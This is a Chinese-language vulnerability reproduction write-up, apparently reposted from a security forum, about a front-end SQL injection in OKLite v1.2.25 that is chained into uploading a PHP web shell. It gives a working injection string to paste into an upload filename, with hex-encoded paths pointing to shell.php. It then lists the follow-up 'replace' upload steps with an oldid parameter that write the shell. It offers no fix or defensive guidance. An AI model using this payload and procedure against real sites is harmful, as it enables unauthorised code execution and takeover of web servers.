# OKLite v1.2.25 SQL注入导致getshell(前台)

> 原文：[https://www.zhihuifly.com/t/topic/3055](https://www.zhihuifly.com/t/topic/3055)

# OKLite v1.2.25 SQL注入导致getshell(前台)

## 一、漏洞简介

这个漏洞在2017年在PHPOK当中就被畅师傅就被发现了。PHPOK系统被修复了，但是在OKLite当中还存在。

## 二、漏洞影响

OKLite v1.2.25 版本

## 三、复现过程

地址：http://www.0-sec.org/index.php?id=message

在线留言处上传一个图片并抓包，把文件名修改为：

```
1','pf3qm0js3gb2s5f33r7lf14vl3','30'),('1',0x7265732f3230313931302f30342f,'shell.jpg','jpg',0x7265732f3230313931302f30352f7368656c6c2e706870,'1570161575','abc 
```

![image](img/e6fe55b0674306fd80c5addd150c1711.png)

上传成功之后会返回图片的id和保存的路径：

![image](img/59da562690a651c534a6343544dcfda1.png)

再次上传一个图片，把地址中的save改成replace，添加一个参数名为`oldid`，值为图片的id + 1。

图片的内容改为恶意的php代码：

![image](img/6d2640e5c0b685957d22c308062005b0.png)

上传完成之后可在`res\201910\05`目录下生成一个shell.php

![image](img/a80daab1e0b3bbabd6b7605a063020c7.png)